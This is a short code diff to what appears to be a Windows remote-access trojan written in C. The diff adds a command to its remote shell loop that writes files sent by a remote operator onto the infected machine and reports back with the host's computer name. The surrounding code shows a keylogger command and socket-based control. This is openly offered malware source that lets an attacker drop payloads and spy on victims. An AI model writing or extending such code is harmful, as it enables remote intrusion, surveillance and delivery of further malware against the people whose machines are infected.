@@ -89,6 +89,38 @@ void Shell()
       WSACleanup();
       exit(0);
     }
+    else if (strncmp("file:", buffer, 5) == 0)
+    {
+      // Get the file size
+      char *token = strtok(buffer, ":");
+      token = strtok(NULL, ":");
+      int size = atoi(token);
+
+      // Get the filename
+      token = strtok(NULL, ":");
+      char *filename = token;
+
+      // Get the file contents
+      token = strtok(NULL, ":");
+      char *file_contents = token;
+
+      // Create a file pointer
+      FILE *file;
+
+      // Open the file
+      file = fopen(filename, "wb");
+
+      // Write the file contents
+      fwrite(file_contents, sizeof(char), size, file);
+
+      // Close the file
+      fclose(file);
+
+      // Send success message
+      char suc[128];
+      sprintf(suc, "[+] File %s uploaded successfully on `%s`.\n", filename, getenv("COMPUTERNAME"));
+      send(sock, suc, sizeof(suc), 0);
+    }
     else if (strcmp("keylogger:start", buffer) == 0)
     {
       // info("Starting Keylogger..");
